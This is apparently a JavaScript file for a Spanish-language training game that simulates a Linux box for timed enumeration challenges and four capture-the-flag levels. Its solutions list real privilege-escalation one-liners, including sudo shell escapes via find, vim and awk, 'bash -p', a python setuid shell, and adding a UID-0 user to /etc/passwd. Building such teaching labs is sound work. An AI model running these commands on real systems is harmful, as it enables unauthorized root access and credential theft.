/* Zona de juego: contrarreloj y caza de banderas de cada nivel. Las misiones están en js/lessons.js.
   Reutiliza el motor del laboratorio (js/redteam.js) para montar cada escenario. */
(function (G) {
  'use strict';

  const RT = G.REDTEAM;
  const strip = (s) => s.replace(/\x01.|\x02/g, '');

  /* Filas de salida sin adornos, para comprobar resultados. */
  const out = (c) => strip(c.r.out).split('\n').filter((l) => l.trim() !== '');
  const root = (c) => c.sh.user === 'root';
  const asUser = (c, u) => c.sh.user === u;
  const file = (c, p) => {
    const n = c.fs.find(p);
    return n && n.type === 'file' ? n.content : null;
  };

  /* ================= CONTRARRELOJ ================= */
  /* Cada reto trae su propio setup, así que la caja se reinicia y las escaladas no se pisan. */

  const foothold = (spec) => (sh, fs) => RT.buildBox(sh, fs, Object.assign({ foothold: 'www-data' }, spec));

  const CH1 = [
    { goal: 'Averigua <b>con qué usuario</b> estás', setup: foothold({}), sol: 'whoami', ok: (c) => /^www-data$/m.test(strip(c.r.out)) },
    { goal: 'Muestra tu usuario y tus <b>grupos</b>', setup: foothold({}), sol: 'id', ok: (c) => /uid=33/.test(c.r.out) },
    { goal: 'Averigua el <b>nombre de la máquina</b>', setup: foothold({}), sol: 'hostname', ok: (c) => /fragua/.test(c.r.out) },
    { goal: 'Mira qué <b>versión del núcleo</b> corre', setup: foothold({}), sol: 'uname -a', ok: (c) => /Linux/.test(c.r.out) },
    { goal: 'Lista los <b>usuarios</b> de la máquina', setup: foothold({}), sol: 'cat /etc/passwd', ok: (c) => /root:x:0/.test(c.r.out) },
    { goal: '¿En qué <b>carpeta</b> estás?', setup: foothold({}), sol: 'pwd', ok: (c) => /\/var\/www/.test(c.r.out) },
    {
      goal: 'Busca <b>contraseñas</b> dentro de /var/www',
      setup: foothold({ files: [{ path: '/var/www/config.php', content: "db_password = 'hunter2'\n", owner: 'www-data' }] }),
      sol: 'grep -ri password /var/www',
      ok: (c) => /hunter2/.test(c.r.out),
    },
    { goal: 'Comprueba qué puedes ejecutar con <b>sudo</b>', setup: foothold({ sudoers: { 'www-data': [{ bin: '/usr/bin/vim', runas: 'root', nopasswd: true }] } }), sol: 'sudo -l', ok: (c) => /may run/.test(c.r.out) },
    { goal: 'Busca <b>binarios SUID</b> en todo el sistema', setup: foothold({ suid: ['/usr/bin/find'] }), sol: 'find / -perm -4000 -type f 2>/dev/null', ok: (c) => out(c).some((l) => /\/find$/.test(l)) },
    { goal: 'Busca binarios con <b>capabilities</b>', setup: foothold({ caps: { '/usr/bin/python3': 'cap_setuid+ep' } }), sol: 'getcap -r / 2>/dev/null', ok: (c) => /cap_setuid/.test(c.r.out) },
    { goal: 'Lee las <b>tareas programadas</b> del sistema', setup: foothold({}), sol: 'cat /etc/crontab', ok: (c) => /root/.test(c.r.out) && /cron/.test(strip(c.r.out) + c.line) },
    { goal: 'Lee la <b>bandera de usuario</b> de /var/www', setup: foothold({ files: [{ path: '/var/www/user.txt', content: 'victoria\n', owner: 'www-data' }] }), sol: 'cat /var/www/user.txt', ok: (c) => /victoria/.test(c.r.out) },
    { goal: 'Mira los <b>permisos</b> de /etc/passwd', setup: foothold({}), sol: 'ls -l /etc/passwd', ok: (c) => /passwd/.test(c.r.out) && /rw/.test(c.r.out) },
    { goal: 'Mira qué <b>puertos</b> están abiertos', setup: foothold({}), sol: 'ss -tulnp', ok: (c) => /LISTEN/.test(c.r.out) },
  ];

  const CH2 = [
    { goal: 'Hazte <b>root</b> con un sudo mal puesto en <b>find</b>', setup: foothold({ sudoers: { 'www-data': [{ bin: '/usr/bin/find', runas: 'root', nopasswd: true }] } }), sol: 'sudo find . -exec /bin/sh \\; -quit', ok: root },
    { goal: 'Hazte <b>root</b> con un sudo mal puesto en <b>vim</b>', setup: foothold({ sudoers: { 'www-data': [{ bin: '/usr/bin/vim', runas: 'root', nopasswd: true }] } }), sol: 'sudo vim -c ":!/bin/sh"', ok: root },
    { goal: 'Hazte <b>root</b> con un sudo mal puesto en <b>awk</b>', setup: foothold({ sudoers: { 'www-data': [{ bin: '/usr/bin/awk', runas: 'root', nopasswd: true }] } }), sol: "sudo awk 'BEGIN{system(\"/bin/sh\")}'", ok: root },
    { goal: 'Hazte <b>root</b> con un <b>bash SUID</b>', setup: foothold({ suid: ['/usr/bin/bash'] }), sol: '/usr/bin/bash -p', ok: root },
    { goal: 'Hazte <b>root</b> con un <b>find SUID</b>', setup: foothold({ suid: ['/usr/bin/find'] }), sol: 'find . -exec /bin/sh -p \\; -quit', ok: root },
    {
      goal: 'Hazte <b>root</b> con <b>python + cap_setuid</b>',
      setup: (sh, fs) => {
        foothold({ caps: { '/usr/bin/python3': 'cap_setuid+ep' } })(sh, fs);
        sh.installed.add('python3');
      },
      sol: 'python3 -c \'import os; os.setuid(0); os.system("/bin/bash")\'',
      ok: root,
    },
    {
      goal: 'Añade un usuario con <b>UID 0</b> a /etc/passwd y hazte root',
      setup: foothold({ passwdMode: 0o666 }),
      sol: 'echo "pwn::0:0::/root:/bin/bash" >> /etc/passwd; su pwn',
      ok: root,
    },
    {
      goal: 'Pivota a <b>carlos</b> con la contraseña <code>Verano2024</code>',
      setup: foothold({ users: [{ name: 'carlos', uid: 1000, pass: 'Verano2024' }] }),
      sol: 'su carlos\nVerano2024',
      pass: 'Verano2024',
      ok: (c) => asUser(c, 'carlos'),
    },
    {
      goal: 'Ejecuta <code>id</code> como <b>backup</b> con sudo -u',
      setup: foothold({ users: [{ name: 'backup', uid: 1001 }], sudoers: { 'www-data': [{ bin: '/usr/bin/id', runas: 'backup', nopasswd: true }] } }),
      sol: 'sudo -u backup id',
      ok: (c) => /uid=1001\(backup\)/.test(c.r.out),
    },
    {
      goal: 'Lee la bandera de <b>root</b> tras escalar con bash SUID',
      setup: foothold({ suid: ['/usr/bin/bash'], files: [{ path: '/root/root.txt', content: 'root-conseguido\n', owner: 'root', mode: 0o600 }] }),
      sol: '/usr/bin/bash -p\ncat /root/root.txt',
      pass: null,
      extra: 'cat /root/root.txt',
      ok: (c) => /root-conseguido/.test(c.r.out) || root(c),
    },
  ];

  /* ================= CAZA DE BANDERAS ================= */
  /* El valor «flag» es de reserva: js/app.js lo cambia por un número aleatorio en cada navegador.
     Una bandera solo cuenta si sale en un resultado de pocas filas (maxLines). */

  const flagFile = (path, owner, mode) => (f) => ({ path, content: f + '\n', owner: owner || 'root', mode });

  const FLAGS1 = [
    { id: 'rt1-home', name: 'A plena vista', flag: 'FLAG{111111111111}', clue: 'Nada más entrar, en tu carpeta /var/www hay un archivo de notas con algo dentro.', hint: 'ls -la /var/www y luego cat sobre el archivo que encuentres.' },
    { id: 'rt1-conf', name: 'Credencial olvidada', flag: 'FLAG{222222222222}', clue: 'En algún archivo .conf o .php de /var/www alguien dejó una cadena FLAG{...} entre la configuración.', hint: 'grep -r FLAG /var/www 2>/dev/null' },
    { id: 'rt1-hidden', name: 'Lo que empieza por punto', flag: 'FLAG{333333333333}', clue: 'Los archivos ocultos empiezan por punto y no salen con un ls normal. Hay uno en tu carpeta.', hint: 'ls -la y después cat sobre el archivo que empiece por punto.' },
    { id: 'rt1-env', name: 'En el entorno', flag: 'FLAG{444444444444}', clue: 'A veces las credenciales viven en las variables de entorno del proceso.', hint: 'env | grep FLAG' },
  ];
  function setupCtf1(sh, fs) {
    const f = (id) => FLAGS1.find((x) => x.id === id).flag;
    RT.buildBox(sh, fs, {
      foothold: 'www-data',
      files: [
        { path: '/var/www/LEEME.txt', content: 'Servidor de la empresa. Nivel 1: 4 banderas.\nAviso: una bandera solo cuenta si la sacas en un resultado de pocas líneas.\n' },
        flagFile('/var/www/notas.txt', 'www-data')(f('rt1-home')),
        { path: '/var/www/html/wp-config.php', content: "<?php\ndefine('DB_USER','admin');\n// pendiente borrar: " + f('rt1-conf') + '\ndefine(\'DB_HOST\',\'localhost\');\n', owner: 'www-data' },
        { path: '/var/www/html/index.php', content: '<?php echo "Hola";\n', owner: 'www-data' },
        { path: '/var/www/html/estilo.css', content: 'body{color:#000}\n', owner: 'www-data' },
        flagFile('/var/www/.secreto', 'www-data')('Bien visto. ' + f('rt1-hidden')),
      ],
    });
    sh.env.API_TOKEN = f('rt1-env');
    sh.env.LANG = 'es_ES.UTF-8';
  }

  const FLAGS2 = [
    { id: 'rt2-cron', name: 'La tarea de las 3', flag: 'FLAG{555555555555}', clue: 'Hay una tarea programada que corre un script. El propio script lleva una bandera en un comentario.', hint: 'cat /etc/crontab para ver qué script corre, y luego cat sobre ese script.' },
    { id: 'rt2-suid', name: 'El binario raro', flag: 'FLAG{666666666666}', clue: 'Entre los binarios SUID hay uno que no es normal, en /opt. Su carpeta guarda un archivo de notas.', hint: 'find / -perm -4000 2>/dev/null para localizarlo, y mira qué hay en su carpeta.' },
    { id: 'rt2-writable', name: 'Donde no debería', flag: 'FLAG{777777777777}', clue: 'Hay un archivo escribible por todos en una ruta del sistema donde eso es un error. Dentro, una bandera.', hint: 'find / -writable -type f 2>/dev/null y cat sobre el que esté fuera de tu carpeta.' },
    { id: 'rt2-hist', name: 'El historial delator', flag: 'FLAG{888888888888}', clue: 'Un usuario descuidado dejó su historial de comandos lleno. En una línea escribió una bandera.', hint: 'grep FLAG /home/*/.bash_history 2>/dev/null' },
  ];
  function setupCtf2(sh, fs) {
    const f = (id) => FLAGS2.find((x) => x.id === id).flag;
    RT.buildBox(sh, fs, {
      foothold: 'www-data',
      users: [{ name: 'operador', uid: 1000, homeMode: 0o755 }],
      suid: ['/opt/monitor/check'],
      cron: { script: '/opt/backup/backup.sh', owner: 'root' },
      files: [
        { path: '/var/www/LEEME.txt', content: 'Nivel 2: 4 banderas. Hay que ENUMERAR para encontrarlas (sin escalar todavía).\n' },
        { path: '/etc/crontab', content: '# m h dom mon dow user\tcommand\n*/5 * * * * root /opt/backup/backup.sh\n', owner: 'root' },
        { path: '/opt/backup/backup.sh', content: '#!/bin/bash\n# copia nocturna. ' + f('rt2-cron') + '\ntar -czf /tmp/web.tgz /var/www\n', owner: 'root', mode: 0o644 },
        { path: '/opt/monitor/notas.txt', content: 'Notas del binario de monitor.\n' + f('rt2-suid') + '\n', owner: 'root', mode: 0o644 },
        { path: '/var/tmp/.cache', content: 'temporal\n' + f('rt2-writable') + '\n', owner: 'root', mode: 0o666 },
        { path: '/home/operador/.bash_history', content: 'ls\ncd /tmp\necho ' + f('rt2-hist') + '\nclear\nexit\n', owner: 'operador', mode: 0o644 },
      ],
    });
  }

  const FLAGS3 = [
    { id: 'rt3-pass', name: 'Contraseña reutilizada', flag: 'FLAG{999999999999}', clue: 'En un config de /var/www está la contraseña del usuario laura. Pivota a ella y lee su user.txt.', hint: "grep -ri pass /var/www, luego su laura y la contraseña que encuentres; después cat /home/laura/user.txt." },
    { id: 'rt3-ssh', name: 'La llave privada', flag: 'FLAG{101010101010}', clue: 'El usuario laura guarda una clave SSH privada. Con ella se entra a la cuenta de marcos, que tiene una bandera.', hint: 'Mira /home/laura/.ssh/, usa la clave: ssh marcos@localhost; después cat sobre su user.txt.' },
    { id: 'rt3-sudou', name: 'Correr como otro', flag: 'FLAG{111213141516}', clue: 'marcos puede ejecutar cat como el usuario deploy (míralo con sudo -l). deploy guarda una bandera que marcos no puede leer.', hint: 'sudo -u deploy cat /home/deploy/flag.txt' },
    { id: 'rt3-group', name: 'Cadena completa', flag: 'FLAG{171819202122}', clue: 'deploy tiene permiso para leer un archivo del administrador del sistema en /srv. Ahí está la última.', hint: 'Como marcos: sudo -u deploy cat /srv/admin/secreto.txt' },
  ];
  function setupCtf3(sh, fs) {
    const f = (id) => FLAGS3.find((x) => x.id === id).flag;
    RT.buildBox(sh, fs, {
      foothold: 'www-data',
      users: [
        { name: 'laura', uid: 1000, pass: 'Primavera#2024' },
        { name: 'marcos', uid: 1001 },
        { name: 'deploy', uid: 1002 },
      ],
      sudoers: { marcos: [{ bin: '/usr/bin/cat', runas: 'deploy', nopasswd: true }] },
      files: [
        { path: '/var/www/LEEME.txt', content: 'Nivel 3: 4 banderas. Hay que PIVOTAR de usuario en usuario.\n' },
        { path: '/var/www/html/db.php', content: "<?php\n$user='laura';\n$password='Primavera#2024';\n", owner: 'www-data' },
        flagFile('/home/laura/user.txt', 'laura', 0o640)(f('rt3-pass')),
        { path: '/home/laura/.ssh/id_rsa', content: '-----BEGIN OPENSSH PRIVATE KEY-----\nclave-de-marcos-simulada\n-----END OPENSSH PRIVATE KEY-----\n', owner: 'laura', mode: 0o600 },
        flagFile('/home/marcos/user.txt', 'marcos', 0o640)(f('rt3-ssh')),
        flagFile('/home/deploy/flag.txt', 'deploy', 0o640)(f('rt3-sudou')),
        flagFile('/srv/admin/secreto.txt', 'deploy', 0o640)(f('rt3-group')),
      ],
    });
    /* la clave privada de laura abre la cuenta de marcos */
    sh.rt.sshKeys = { 'laura:id_rsa': 'marcos' };
  }

  const FLAGS4 = [
    { id: 'rt4-root', name: 'La bandera de root', flag: 'FLAG{232425262728}', clue: 'La máquina tiene un camino a root (encuéntralo con sudo -l o buscando SUID). Una vez root, lee /root/root.txt.', hint: 'sudo -l / find -perm -4000; escala a root y cat /root/root.txt' },
    { id: 'rt4-shadow', name: 'El hash del jefe', flag: 'FLAG{293031323334}', clue: 'Solo root puede leer /etc/shadow. Ahí, en un comentario, se coló una bandera.', hint: 'Ya como root: cat /etc/shadow' },
    { id: 'rt4-home', name: 'La caja fuerte', flag: 'FLAG{353637383940}', clue: 'El usuario ceo guarda algo en su carpeta que ni él quería que vieras. Solo root entra.', hint: 'Como root: cat /home/ceo/privado.txt' },
    { id: 'rt4-history', name: 'El rastro de root', flag: 'FLAG{414243444546}', clue: 'El propio root dejó una bandera en el historial de su cuenta.', hint: 'Como root: cat /root/.bash_history' },
  ];
  function setupCtf4(sh, fs) {
    const f = (id) => FLAGS4.find((x) => x.id === id).flag;
    RT.buildBox(sh, fs, {
      foothold: 'www-data',
      users: [{ name: 'ceo', uid: 1000 }],
      sudoers: { 'www-data': [{ bin: '/usr/bin/find', runas: 'root', nopasswd: true }] },
      files: [
        { path: '/var/www/LEEME.txt', content: 'Nivel 4: 4 banderas, todas tras conseguir ROOT.\nConsejo: sudo -l te dice el camino.\n' },
        { path: '/etc/shadow', content: 'root:$6$sim$hash:19800::::::\n# nota interna: ' + f('rt4-shadow') + '\nceo:$6$sim$h2:19800::::::\n', owner: 'root', mode: 0o640 },
        flagFile('/root/root.txt', 'root', 0o600)(f('rt4-root')),
        flagFile('/home/ceo/privado.txt', 'ceo', 0o600)(f('rt4-home')),
        { path: '/root/.bash_history', content: 'id\nwhoami\necho ' + f('rt4-history') + '\nhistory -c\n', owner: 'root', mode: 0o600 },
      ],
    });
  }

  G.GAMES = {
    tools: { buildBox: RT.buildBox, putFile: RT.putFile },
    sets: {
      1: { challenges: CH1, flags: FLAGS1, setup: setupCtf1, maxLines: 6 },
      2: { challenges: CH1.concat(CH2.slice(0, 2)), flags: FLAGS2, setup: setupCtf2, maxLines: 6 },
      3: { challenges: CH2, flags: FLAGS3, setup: setupCtf3, maxLines: 6 },
      4: { challenges: CH2, flags: FLAGS4, setup: setupCtf4, maxLines: 6 },
    },
    h: { out, root, asUser, file },
  };
})(typeof window !== 'undefined' ? window : globalThis);
